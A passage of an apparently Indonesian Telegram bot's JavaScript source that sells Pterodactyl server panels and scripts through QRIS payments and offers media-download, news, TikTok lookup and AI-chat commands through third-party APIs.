              `if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; if [[ ! -z \${CUSTOM_ENVIRONMENT_VARIABLES} ]]; then vars=$(echo \${CUSTOM_ENVIRONMENT_VARIABLES} | tr ";" "\\n"); for line in $vars; do export $line; done fi; /usr/local/bin/\${CMD_RUN};`,
            environment: {
              CMD_RUN: "npm start",
              AUTO_UPDATE: "0",
              NODE_PACKAGES: ""
            },
            limits: {
              memory: pack.memory,
              disk: pack.disk,
              cpu: pack.cpu,
              swap: 0,
              io: 500
            },
            feature_limits: {
              databases: 5,
              backups: 5,
              allocations: 1
            },
            deploy: {
              locations: [srv.loc],
              dedicated_ip: false,
              port_range: []
            }
          },
          {
            headers: {
              Authorization: `Bearer ${srv.token}`,
              "Content-Type": "application/json"
            }
          }
        );

        await ctx.telegram.deleteMessage(chatId, qrisMsgId).catch(() => {});

        await ctx.reply(
`<b>✅ Berhasil Membuat Panel</b>

👤 <b>Username:</b> <code>${username}</code>
🔐 <b>Password:</b> <code>${password}</code>
📧 <b>Email:</b> <code>${email}</code>

<b>Login Server:</b>
- Domain: ${srv.domain}

<pre>📑 Rules Pembelian Panel</pre>
━────────────────────
- akun ini bersifat <b>rahasia</b> dan hanya diberikan <b>satu kali</b>
- Pengguna bertanggung jawab penuh atas keamanan data akses.
- Garansi layanan berlaku selama <b>10 (Sepuluh) hari</b> sejak tanggal aktivasi.
- Klaim garansi wajib disertai bukti transaksi yang sah.`,
          { parse_mode: "HTML" }
        );
        
        await sendTesti("panel", {
          userId,
          username: username,
          serverName: srv.name,
          package: sizeKey.toUpperCase(),
          amount: pack.price,
          orderId
        });

        panelSession.delete(ctx.from.id);

      } catch (err) {
        clearInterval(check);

        console.error("PTERO ERROR:", err.response?.data || err.message);

        await ctx.reply(
`<blockquote>❌ <b>GAGAL MEMBUAT PANEL</b>

Pembayaran sukses, tapi server gagal dibuat.
Hubungi admin @ReyValdz

🌐 Order ID: ${orderId}</blockquote>`,
          { parse_mode: "HTML" }
        );
      }
    }, config.PAKASIR_CHECK_INTERVAL);

  } catch (err) {
    console.error("QRIS ERROR:", err.response?.data || err.message);
    panelSession.delete(ctx.from.id);
    ctx.reply("❌ Gagal memproses pembayaran");
  }
});

// ---------- [ Buy Script ] ------------ \\
bot.action("buyscript", async (ctx) => {
  try {
    if (ctx.chat.type !== "private") {
      return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
    }
   
    const allScripts = fileScript.getAllScripts();
    
    if (allScripts.length === 0) {
      return editMenuMessage(ctx,
        `<blockquote><b>Tidak ada script tersedia saat ini.</b></blockquote>`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } }
      );
    }

    ScriptSession.set(ctx.from.id, {
      step: "select_script",
      scriptPage: 0
    });

    await sendScriptPage(ctx, 0);

  } catch (error) {
    console.error("Error in buyscript:", error.message);
    ctx.reply("❌ Gagal membuka script store. Silakan coba lagi.");
  }
});

async function sendScriptPage(ctx, page) {
  const pageData = fileScript.getScriptsPage(page, 6);
  
  if (pageData.scripts.length === 0 && page > 0) {
    return sendScriptPage(ctx, 0);
  }

  if (pageData.scripts.length === 0) {
    return ctx.reply(
      `<blockquote><b>Tidak ada script tersedia saat ini.</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const buttons = pageData.scripts.map(script => [
    Markup.button.callback(
      `${script.name} - Rp${script.price.toLocaleString('id-ID')}`,
      `script_select|${script.id}`
    )
  ]);

  const navButtons = [];
  
  if (page > 0) {
    navButtons.push(
      Markup.button.callback("⬅️ Prev", `script_page|${page - 1}`)
    );
  }
  
  if (page < pageData.pages - 1) {
    navButtons.push(
      Markup.button.callback("Next ➡️", `script_page|${page + 1}`)
    );
  }

  if (navButtons.length > 0) {
    buttons.push(navButtons);
  }

  buttons.push([
    Markup.button.callback("❌ Batal", "script_cancel")
  ]);

  const message = page > 0 
    ? `<blockquote>📦 <b>LIST SCRIPT</b> (Halaman ${page + 1}/${pageData.pages})\n\nPilih script yang ingin dibeli:</blockquote>`
    : `<blockquote>📦 <b>LIST SCRIPT</b>\n\nPilih script yang ingin dibeli:</blockquote>`;

  if (ctx.callbackQuery) {
    await editMenuMessage(ctx, message, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: buttons }
    });
  } else {
    await ctx.reply(message, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: buttons }
    });
  }
}

bot.action(/^script_page\|(\d+)$/, async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }

  const page = parseInt(ctx.match[1]);
  await ctx.answerCbQuery();
  
  const session = ScriptSession.get(ctx.from.id);
  if (session) {
    session.scriptPage = page;
    ScriptSession.set(ctx.from.id, session);
  }
  
  await sendScriptPage(ctx, page);
});

bot.action(/^script_select\|(.+)$/, async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }

  const scriptId = ctx.match[1];
  await ctx.answerCbQuery();
  
  const script = fileScript.getScript(scriptId);
  if (!script) {
    return editMenuMessage(ctx, "❌ Script tidak ditemukan.", {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: [] }
    });
  }

  ScriptSession.set(ctx.from.id, {
    step: "confirm_script",
    selectedScript: script,
    scriptPage: 0
  });

  const description = script.description ? `\n📝 <b>Deskripsi:</b> ${script.description}` : '';

  await editMenuMessage(ctx,
`<blockquote>🛒 <b>KONFIRMASI PEMBELIAN SCRIPT</b>
📦 <b>Script:</b> ${script.name}
💰 <b>Harga:</b> Rp${script.price.toLocaleString('id-ID')}
${description}
<b>Apakah Anda ingin melanjutkan pembelian?</b></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            Markup.button.callback("✅ Konfirmasi", `script_confirm|${scriptId}`),
            Markup.button.callback("❌ Batal", "script_cancel")
          ]
        ]
      }
    }
  );
});

bot.action(/^script_confirm\|(.+)$/, async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }

  const scriptId = ctx.match[1];
  await ctx.answerCbQuery("⏳ Memproses pembayaran...");
  
  const session = ScriptSession.get(ctx.from.id);
  const script = fileScript.getScript(scriptId);
  
  if (!session || !script) {
    return editMenuMessage(ctx, "❌ Session habis atau script tidak ditemukan.", {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: [] }
    });
  }

  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  const orderId = `SCR${Date.now()}${userId}`;

  session.step = "script_payment";
  session.paymentOrderId = orderId;
  session.selectedScript = script;
  ScriptSession.set(ctx.from.id, session);

  try {
    await ctx.deleteMessage().catch(() => {});

    const { data } = await axios.post(
      "https://app.pakasir.com/api/transactioncreate/qris",
      {
        project: config.PAKASIR_PROJECT,
        order_id: orderId,
        amount: script.price,
        api_key: config.PAKASIR_API_KEY
      },
      {
        timeout: 10000
      }
    );

    if (!data.payment || !data.payment.payment_number) {
      throw new Error("Gagal membuat QRIS");
    }

    const filePath = path.join(__dirname, `qris_script_${orderId}.png`);
    await QRCode.toFile(filePath, data.payment.payment_number, { scale: 8 });
    
    const qrisMsg = await ctx.replyWithPhoto(
      { source: filePath },
      {
        caption: `<blockquote>🧾 <b>PEMBAYARAN SCRIPT</b>

📦 <b>Script:</b> ${script.name}
💰 <b>Harga:</b> Rp${script.price.toLocaleString('id-ID')}
🆔 <b>Order ID:</b> ${orderId}

<b>📌 Instruksi:</b>
1. Scan QRIS di atas untuk pembayaran
2. Script akan dikirim otomatis setelah pembayaran berhasil
3. Pembayaran diverifikasi otomatis

<b>⏱️ Berlaku 15 menit!</b></blockquote>`,
        parse_mode: "HTML"
      }
    );

    fs.unlinkSync(filePath);
    
    session.qrisMessageId = qrisMsg.message_id;
    session.qrisChatId = chatId;
    ScriptSession.set(ctx.from.id, session);
    
    startScriptPaymentCheck(ctx, orderId, script.price, scriptId);

  } catch (error) {
    console.error("Script payment error:", error.message);
    await ctx.reply("❌ Gagal membuat pembayaran. Silakan coba lagi.", {
      parse_mode: "HTML"
    });
    ScriptSession.delete(ctx.from.id);
  }
});

bot.action("script_cancel", async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }

  ScriptSession.delete(ctx.from.id);
  
  if (ctx.callbackQuery) {
    await editMenuMessage(ctx, "❌ Pembelian script dibatalkan.", {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: [] }
    });
  } else {
    await ctx.reply("❌ Pembelian script dibatalkan.");
  }
});

// -------- [ Commnad: Cek Saldo ] --------- \\
bot.command("ceksaldo", async (ctx) => {
    const userId = ctx.from.id.toString();
    const username = ctx.from.username || ctx.from.first_name || 'User';
    
    const saldo = getUserSaldo(userId);
    
    await ctx.reply(
        `<blockquote>💰 <b>INFO SALDO</b></blockquote>
<blockquote>👤 User: ${username}
🆔 ID: ${userId}
💳 Saldo: <b>Rp ${saldo.toLocaleString('id-ID')}</b></blockquote>`,
        { parse_mode: "HTML" }
    );
});

// -------- [ Command: Add saldo ] ---------- \\
bot.command("addsaldo", async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isOwner(userId)) {
        return ctx.reply("<blockquote>❌ Command ini hanya untuk owner!</blockquote>", { parse_mode: "HTML" });
    }
    
    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 2) {
        return ctx.reply(
            `<blockquote>❌ Format salah!</blockquote>
<blockquote>Contoh: /addsaldo 123456789 100000</blockquote>`,
            { parse_mode: "HTML" }
        );
    }
    
    const targetId = args[0];
    const amount = parseInt(args[1]);
    
    if (isNaN(amount) || amount <= 0) {
        return ctx.reply("<blockquote>❌ Jumlah tidak valid!</blockquote>", { parse_mode: "HTML" });
    }
    
    const newSaldo = updateUserSaldo(targetId, amount);
    
    await ctx.reply(
        `<blockquote>✅ <b>ADD SALDO BERHASIL</b></blockquote>
<blockquote>👤 Target ID: ${targetId}
💰 Jumlah: Rp ${amount.toLocaleString('id-ID')}
💳 Saldo sekarang: Rp ${newSaldo.toLocaleString('id-ID')}</blockquote>`,
        { parse_mode: "HTML" }
    );
    
    // Notifikasi ke user target
    try {
        await ctx.telegram.sendMessage(
            targetId,
            `<blockquote>💰 <b>SALDO ANDA BERTAMBAH</b></blockquote>
<blockquote>➕ Jumlah: Rp ${amount.toLocaleString('id-ID')}
💳 Total saldo: Rp ${newSaldo.toLocaleString('id-ID')}</blockquote>`,
            { parse_mode: "HTML" }
        );
    } catch (error) {
        console.log("Gagal kirim notifikasi ke target:", error.message);
    }
});

// ---------- [ Command: Add File ] ------------ \\  
bot.command("addfile", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== config.owner && !config.admins?.includes(userId)) {
    return ctx.reply("❌ Command ini hanya untuk admin.");
  }

  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.document) {
    return ctx.reply(
      `<blockquote>📁 <b>TAMBAH SCRIPT</b></blockquote>\n<b>Format:</b>\n<code>/addfile [harga] [deskripsi]</code>\n<b>Contoh:</b> <code>/addfile 50000 Script bot Telegram lengkap</code>`,
      { parse_mode: "HTML" }
    );
  }

  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 1) {
    return ctx.reply("❌ Format: /addfile [harga] [deskripsi]");
  }

  const price = parseInt(args[0]);
  if (isNaN(price) || price < 1000) {
    return ctx.reply("❌ Harga harus angka dan minimal Rp1.000");
  }

  const description = args.slice(1).join(" ") || "Tidak ada deskripsi";
  const fileId = reply.document.file_id;
  const fileName = reply.document.file_name || `script_${Date.now()}.js`;

  // Generate script ID
  const scriptId = `SCR${Date.now()}${Math.random().toString(36).substr(2, 5)}`;
  
  fileScript.addScript(scriptId, fileName, fileId, price, description);

  await ctx.reply(
`<blockquote>✅ <b>SCRIPT BERHASIL DITAMBAHKAN</b>
📦 <b>Nama:</b> ${fileName}
💰 <b>Harga:</b> Rp${price.toLocaleString('id-ID')}
🆔 <b>ID:</b> ${scriptId}
📝 <b>Deskripsi:</b> ${description}

<b>Script sekarang tersedia</b></blockquote>`,
    { parse_mode: "HTML" }
  );

  //// ---------- kirim notifikasi ---------- ///
  try {
    const adminName = ctx.from.username 
      ? `@${ctx.from.username}` 
      : (ctx.from.first_name || ctx.from.last_name || "Admin");
    
    await SendProduk(
      "script", 
      {
        nama: fileName,
        harga: price,
        fileName: fileName,
        description: description,
        scriptId: scriptId
      }, 
      adminName
    );
  } catch (notifError) {
    console.error("[ERROR] Gagal mengirim notifikasi channel:", notifError.message);
  }

  console.log(`📁 Script added: ${fileName}`);
});

// ---------- [ Command: Delete File ] ------------ \\  
bot.command("delfile", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== config.owner && !config.admins?.includes(userId)) {
    return ctx.reply("❌ Command ini hanya untuk admin.");
  }

  const allScripts = fileScript.getAllScripts();
  
  if (allScripts.length === 0) {
    return ctx.reply(
      `<blockquote><b>Tidak ada script yang bisa dihapus.</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  ScriptSession.set(ctx.from.id, {
    step: "delete_script",
    deletePage: 0,
    isAdmin: true
  });

  await sendDeleteScriptPage(ctx, 0);
});

bot.action(/^delete_page\|(\d+)$/, async (ctx) => {
  const page = parseInt(ctx.match[1]);
  await ctx.answerCbQuery();
  
  const session = ScriptSession.get(ctx.from.id);
  if (session && session.isAdmin) {
    session.deletePage = page;
    ScriptSession.set(ctx.from.id, session);
  }
  
  await sendDeleteScriptPage(ctx, page);
});

// konfirmasi hapus script
bot.action(/^delete_script\|(.+)$/, async (ctx) => {
  const scriptId = ctx.match[1];
  await ctx.answerCbQuery();
  
  const script = fileScript.getScript(scriptId);
  if (!script) {
    return ctx.editMessageText("❌ Script tidak ditemukan.", {
      parse_mode: "HTML"
    });
  }

  ScriptSession.set(ctx.from.id, {
    step: "confirm_delete",
    scriptToDelete: script,
    deletePage: 0,
    isAdmin: true
  });

  await ctx.editMessageText(
`<blockquote>⚠️ <b>KONFIRMASI HAPUS SCRIPT</b>
📦 <b>Script:</b> ${script.name}
💰 <b>Harga:</b> Rp${script.price.toLocaleString('id-ID')}
🆔 <b>ID:</b> ${scriptId}
📝 <b>Deskripsi:</b> ${script.description || 'Tidak ada'}

<b>Apakah Anda yakin ingin menghapus script ini?</b>
<b>⚠️ Aksi ini tidak dapat dibatalkan!</b></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            Markup.button.callback("✅ Ya, Hapus", `confirm_delete|${scriptId}`),
            Markup.button.callback("❌ Batal", "delete_back")
          ]
        ]
      }
    }
  );
});

// konfirmasi delete
bot.action(/^confirm_delete\|(.+)$/, async (ctx) => {
  const scriptId = ctx.match[1];
  await ctx.answerCbQuery("⏳ Menghapus script...");
  
  const script = fileScript.getScript(scriptId);
  if (!script) {
    return ctx.editMessageText("❌ Script tidak ditemukan.", {
      parse_mode: "HTML"
    });
  }

  const deleted = fileScript.deleteScript(scriptId);
  
  if (deleted) {
    await ctx.editMessageText(
      `<blockquote>✅ <b>SCRIPT BERHASIL DIHAPUS</b>\n📦 <b>Script:</b> ${script.name}\n🆔 <b>ID:</b> ${scriptId}</blockquote>`,
      { parse_mode: "HTML" }
    );
    
    console.log(`🗑️ Script deleted: ${script.name}`);
  } else {
    await ctx.editMessageText(
      `<blockquote>❌ <b>GAGAL MENGHAPUS SCRIPT</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }
  
  // session
  ScriptSession.delete(ctx.from.id);
});

bot.action("delete_back", async (ctx) => {
  await ctx.answerCbQuery();
  await sendDeleteScriptPage(ctx, 0);
});

// Cancel delete
bot.action("delete_cancel", async (ctx) => {
  ScriptSession.delete(ctx.from.id);
  
  if (ctx.callbackQuery) {
    await ctx.editMessageText("<blockquote>❌ Penghapusan script dibatalkan.</blockquote>", {
      parse_mode: "HTML"
    });
  }
});

/// -------------------- [ Command : ytmp3 ] -------------------- \\\
bot.command("ytmp3", async (ctx) => {
  const url = ctx.message.text.split(" ")[1];
  if (!url) return safeReply(ctx, "<blockquote><b>Gunakan:</b> <code>/ytmp3 url</code></blockquote>", { parse_mode: "HTML" });
  
  safeReply(ctx, "<blockquote>⏳ <b>Mengambil audio...</b></blockquote>", { parse_mode: "HTML" });
  
  try {
    const res = await axios.get(`https://api-ralzz.vercel.app/download/ytmp3v2?apikey=ubot&url=${encodeURIComponent(url)}`);
    await ctx.replyWithAudio(res.data.result, { 
      caption: "<blockquote>🎵 <b>YouTube Audio Downloaded</b></blockquote>", 
      parse_mode: "HTML" 
    });
  } catch (e) { 
    safeReply(ctx, "<blockquote>❌ <b>Gagal mengambil audio.</b></blockquote>", { parse_mode: "HTML" }); 
  }
});

/// -------------------- [ Command : jarakkota ] -------------------- \\\
bot.command("jarakkota", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  
  if (!text || !text.includes("|")) {
    return ctx.reply(
      "<blockquote>❌ Format salah</blockquote>\n<blockquote>Gunakan:\n/jarakkota kota_asal|kota_tujuan</blockquote>",
      { parse_mode: "HTML" }
    );
  }

  const [from, to] = text.split("|").map(v => v.trim());
  if (!from || !to) return ctx.reply("❌ Kota asal / tujuan tidak valid.");

  try {
    const { data } = await axios.get(
      "https://ikyyzyyrestapi.my.id/tools/jarak",
      { params: { from, to } }
    );

    if (!data.status) return ctx.reply("❌ Gagal menghitung jarak.");

    const km = data.distance_km;
    const meter = data.distance_meter;
    const mapsUrl = `https://www.google.com/maps/dir/?api=1&origin=${encodeURIComponent(from)}&destination=${encodeURIComponent(to)}&travelmode=driving`;

    await ctx.reply(
      `<blockquote>📍 <b>HITUNG JARAK</b>\n\n🏙 Dari : <b>${data.from}</b>\n📍 Ke   : <b>${data.to}</b>\n\n📏 <b>Jarak:</b>\n• ${km} KM\n• ${meter} Meter</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📋 Copy KM", copy_text: { text: km.toString() } },
             { text: "📋 Copy Meter", copy_text: { text: meter.toString() } }],
            [{ text: "📋 Copy Full", copy_text: { text: `${data.from} → ${data.to} = ${km} KM` } }],
            [{ text: "🗺 Buka di Google Maps", url: mapsUrl }]
          ]
        }
      }
    );
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error saat mengambil data jarak.");
  }
});

/// -------------------- [ Command : tiktokmeme ] -------------------- \\\
bot.command('tiktokmeme', async (ctx) => {
  if (!(await checkUserLimit(ctx, 'tiktokmeme'))) return;

  try {
    const loadingMsg = await ctx.reply('<blockquote>⏳ <b>Sedang memproses...</b></blockquote>', {
      parse_mode: 'HTML'
    });

    const response = await axios.get('https://ikyyzyyrestapi.my.id/random/tiktokmeme', {
      responseType: 'arraybuffer',
      timeout: 30000
    });

    const buffer = Buffer.from(response.data);
    await ctx.deleteMessage(loadingMsg.message_id);

    await ctx.replyWithVideo({ source: buffer }, {
      caption: '<blockquote>✅ <b>SUCCESS!</b></blockquote>',
      parse_mode: 'HTML'
    });

  } catch (error) {
    console.error(chalk.red(`❌ TikTok meme error: ${error.message}`));
    await ctx.reply('<blockquote>❌ Gagal mengambil meme TikTok</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : tiktoktobrut ] -------------------- \\\
bot.command('tiktoktobrut', async (ctx) => {
  if (!(await checkUserLimit(ctx, 'tiktoktobrut'))) return;

  try {
    const loadingMsg = await ctx.reply('<blockquote>⏳ <b>Sedang memproses...</b></blockquote>', {
      parse_mode: 'HTML'
    });

    const response = await axios.get('https://ikyyzyyrestapi.my.id/random/tiktok/tobrut', {
      responseType: 'arraybuffer',
      timeout: 30000
    });

    const buffer = Buffer.from(response.data);
    await ctx.deleteMessage(loadingMsg.message_id);

    await ctx.replyWithVideo({ source: buffer }, {
      caption: '<blockquote>✅ <b>SUCCESS!</b></blockquote>',
      parse_mode: 'HTML'
    });

  } catch (error) {
    console.error(chalk.red(`❌ TikTok tobrut error: ${error.message}`));
    await ctx.reply('<blockquote>❌ Gagal mengambil video TikTok tobrut</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : berita ] -------------------- \\\
bot.command("berita", async (ctx) => {
  try {
    const res = await axios.get("https://api.siputzx.my.id/api/berita/merdeka");
    const berita = res.data.data[0];

    const message = `
📰 *${berita.title}*
📅 ${berita.date}
🏷️ Kategori: ${berita.category}

${berita.description}

🔗 [Baca selengkapnya](${berita.link})`;

    await ctx.replyWithPhoto(
      { url: berita.image },
      {
        caption: message, 
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: buttonsBot }
      }
    );
  } catch (err) {
    console.error(err);
    ctx.reply("<blockquote>❌ Gagal mengambil berita.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : kompas ] -------------------- \\\
bot.command('kompas', async (ctx) => {
  try {
    const res = await fetch('https://api.siputzx.my.id/api/berita/kompas');
    const data = await res.json();

    if (!data.status || !data.data) {
      return ctx.reply('<blockquote>❌ Gagal ambil berita dari Kompas.</blockquote>', { parse_mode: 'HTML' });
    }

    const berita = data.data.slice(0, 5);
    for (const b of berita) {
      await ctx.replyWithPhoto(
        { url: b.image },
        {
          caption: `📰 *${b.title}*\n📅 ${b.date}\n🏷️ ${b.category}\n🔗 [Baca selengkapnya](${b.link})`,
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: buttonsBot }
        }
      );
    }
  } catch (e) {
    console.error(e);
    ctx.reply('<blockquote>❌ Error bang, gagal ambil berita Kompas.</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : capcut ] -------------------- \\\
bot.command("capcut", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");

  if (!text || !text.startsWith("http")) {
    return ctx.reply(
      `<blockquote>❌ Format salah</blockquote>\n<blockquote>Gunakan:\n/capcut url-capcut</blockquote>`,
      { parse_mode: 'HTML' }
    );
  }

  await ctx.reply("<blockquote>📥 Sedang Memproses.....</blockquote>", { parse_mode: 'HTML' });

  try {
   const API_KEYS = "kyzz"; // atau ambil dari config
    const { data } = await axios.get(
      "https://api.botcahx.eu.org/api/download/capcut",
      {
        params: { url: text, apikey: API_KEYS },
        timeout: 20000
      }
    );

    if (!data.status || !data.result?.video) {
      return ctx.reply("<blockquote>❌ Gagal download video CapCut</blockquote>", { parse_mode: 'HTML' });
    }

    const res = data.result;
    const videoRes = await axios.get(res.video, {
      responseType: "arraybuffer",
      timeout: 60000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(videoRes.data) },
      {
        caption: `🎬 CAPCUT DOWNLOADER\n\n📌 Judul : ${res.title || "-"}\n👤 Author : ${res.author?.name || "-"}\n\n<blockquote>✅ Berhasil diunduh</blockquote>`,
        parse_mode: 'HTML',
        reply_to_message_id: ctx.message.message_id
      }
    );

  } catch (err) {
    console.error(err);
    ctx.reply("<blockquote>❌ Error saat mengambil video CapCut</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : capcutsearch ] -------------------- \\\
bot.command("capcutsearch", async (ctx) => {
  try {
    const q = ctx.message.text.split(" ").slice(1).join(" ");
    if (!q) {
      return ctx.reply(`<blockquote>❗ Contoh:</blockquote>\n<blockquote>/capcutsearch jj viral tiktok</blockquote>`, { parse_mode: 'HTML' });
    }

    const loading = await ctx.reply("<blockquote>🔍 Mencari template CapCut...</blockquote>", { parse_mode: 'HTML' });

    const { data } = await axios.get(
      "https://ikyyzyyrestapi.my.id/search/capcut",
      { params: { q } }
    );

    if (!data.status || !data.result?.length) {
      return ctx.telegram.editMessageText(
        ctx.chat.id,
        loading.message_id,
        null,
        "<blockquote>❌ Template tidak ditemukan.</blockquote>",
        { parse_mode: 'HTML' }
      );
    }

    const v = data.result[0];

    const caption = `🎬 *CapCut Search*\n\n📌 Judul : *${v.title}*\n⏱ Durasi : ${v.duration}\n▶️ Play : ${v.stats.play}\n❤️ Like : ${v.stats.like}\n⭐ Favorit : ${v.stats.favorite}`;

    await ctx.replyWithVideo(
      v.video.no_watermark,
      { caption, parse_mode: "Markdown" }
    );

    await ctx.deleteMessage(loading.message_id);

  } catch (err) {
    console.error(err?.response?.data || err);
    ctx.reply("<blockquote>❌ Gagal mengambil data CapCut.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : tiktokstalk ] -------------------- \\\
bot.command("tiktokstalk", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 1) {
    return ctx.reply(`<blockquote>⚠️ Contoh:</blockquote>\n<blockquote>/tiktokstalk mrbeast</blockquote>`, { parse_mode: 'HTML' });
  }

  const username = args[0];
  const url = `https://api.siputzx.my.id/api/stalk/tiktok?username=${username}`;

  try {
    const res = await fetch(url);
    const json = await res.json();

    if (!json.status) return ctx.reply("<blockquote>❌ User tidak ditemukan!</blockquote>", { parse_mode: 'HTML' });

    const user = json.data.user;
    const stats = json.data.stats;

    const caption = `
👤 *${user.nickname}* (@${user.uniqueId})
${user.verified ? "✅ Verified" : ""}
🆔 ID: ${user.id}

📝 Bio: ${user.signature || "-"}
🔗 Link: ${user.bioLink?.link || "-"}

📊 Statistik:
- Followers: ${stats.followerCount.toLocaleString()}
- Following: ${stats.followingCount.toLocaleString()}
- Likes: ${stats.heartCount.toLocaleString()}
- Videos: ${stats.videoCount.toLocaleString()}
- Friends: ${stats.friendCount.toLocaleString()}
`.trim();

    await ctx.replyWithPhoto(
      { url: user.avatarLarger },
      { 
        caption, 
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: buttonsBot }
      }
    );
  } catch (e) {
    console.error(e);
    ctx.reply("<blockquote>❌ Gagal mengambil data TikTok.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : blink ] -------------------- \\\
bot.command("blink", async (ctx) => {
  try {
    const prompt = ctx.message.text.split(" ").slice(1).join(" ");
    if (!prompt) {
      return ctx.reply(`<blockquote>❌ Contoh:</blockquote>\n<blockquote>/blink kucing lucu pakai topi</blockquote>`, { parse_mode: 'HTML' });
    }

    await ctx.reply("<blockquote>🎨 Sedang membuat gambar...</blockquote>", { parse_mode: 'HTML' });

    const result = await blinkshot(prompt);
    const buffer = Buffer.from(result.base64, "base64");

    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption: `<blockquote>✨ <b>BlinkShot Image</b></blockquote>\n<blockquote>🧠 Prompt: ${prompt}\n⏱️ Inference: ${result.inferenceTime} ms</blockquote>`,
        parse_mode: "HTML"
      }
    );

  } catch (err) {
    console.error(err);
    ctx.reply("<blockquote>❌ Gagal generate gambar.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : ai ] -------------------- \\\
bot.command("ai", async (ctx) => {
  const question = ctx.message.text.split(" ").slice(1).join(" ");
  if (!question) return ctx.reply(`<blockquote>❌ Contoh:</blockquote>\n<blockquote>/ai kamu siapa?</blockquote>`, { parse_mode: 'HTML' });

  try {
    const api = `https://api-ikyyofficiall-latest.vercel.app/ai/ai4chat/chat?apikey=kyzz&question=${encodeURIComponent(question)}`;
    const res = await axios.get(api).then(r => r.data);

    if (!res.status || !res.result) {
      return ctx.reply("<blockquote>❌ Gagal mendapatkan jawaban OpenAI</blockquote>", { parse_mode: 'HTML' });
    }

    await ctx.reply(
      `<blockquote>🤖 <b>ChatGpt:</b></blockquote>\n\n<blockquote>${res.result}</blockquote>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.error("❌ Error /ai4chat:", err);
    ctx.reply("<blockquote>❌ Terjadi kesalahan saat menghubungi AI.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : cekcuaca ] -------------------- \\\
bot.command("cekcuaca", async (ctx) => {
  sendProvincePage(ctx, 0);
});

/// -------------------- [ Command : pinterest ] -------------------- \\\
bot.command("pinterest", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply(`<blockquote>❌ Gunakan:</blockquote>\n<blockquote>/pinterest kata kunci</blockquote>`, { parse_mode: 'HTML' });
  }

  await ctx.reply("<blockquote>🔍 Mencari gambar...</blockquote>", { parse_mode: 'HTML' });

  try {
    const { data } = await axios.get(
      "https://api.deline.web.id/search/pinterest",
      {
        params: { q: query },
        timeout: 15000
      }
    );

    if (!data.status || !data.data?.length) {
      return ctx.reply("<blockquote>❌ Gambar tidak ditemukan.</blockquote>", { parse_mode: 'HTML' });
    }

    const items = data.data.slice(0, 10);

    const mediaGroup = items.map((item, i) => ({
      type: "photo",
      media: item.image,
      caption: i === 0
        ? `<blockquote>📌 <b>Pinterest Search</b></blockquote>\n<blockquote>🔎 Query: ${query}\n👤 Uploader: ${item.fullname || "-"}</blockquote>`
        : undefined,
      parse_mode: "HTML"
    }));

    await ctx.replyWithMediaGroup(mediaGroup);

  } catch (err) {
    console.error("Pinterest error:", err.message);
    ctx.reply("<blockquote>⚠️ Gagal mengambil gambar</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : autoai ] -------------------- \\\
bot.command("autoai", async (ctx) => {
  const userId = ctx.from.id;

  if (autoAIStatus.get(userId)) {
    autoAIStatus.set(userId, false);
    return ctx.reply("<blockquote>🛑 AutoAI dimatikan. Kamu harus pakai command lagi untuk bertanya.</blockquote>", { parse_mode: 'HTML' });
  } else {
    autoAIStatus.set(userId, true);
